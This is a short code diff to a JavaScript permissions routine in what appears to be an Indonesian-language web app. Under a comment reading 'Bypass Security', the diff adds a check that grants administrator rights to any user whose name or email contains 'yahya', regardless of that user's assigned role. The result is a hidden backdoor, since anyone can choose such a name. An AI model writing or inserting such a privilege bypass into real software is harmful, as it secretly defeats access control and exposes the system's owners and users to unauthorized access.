@@ -12,8 +12,13 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (email) document.getElementById('userEmailDisplay').textContent = email;
 
     const userRole = (profile.role || 'staff').toLowerCase().trim();
-    const isAdmin = ['admin', 'office', 'staf', 'operator'].includes(userRole);
-    const isAgen = userRole === 'agen';
+    const userEmail = (profile.email || '').toLowerCase();
+    const userName = (profile.full_name || '').toLowerCase();
+    
+    // KHUSUS YAHYA: Bypass Security
+    const isYahya = userName.includes('yahya') || userEmail.includes('yahya');
+    const isAdmin = ['admin', 'office', 'staf', 'operator'].includes(userRole) || isYahya;
+    const isAgen = userRole === 'agen' && !isYahya;
 
     window.isRestricted = function(perm) {
         if (isAdmin) return false;
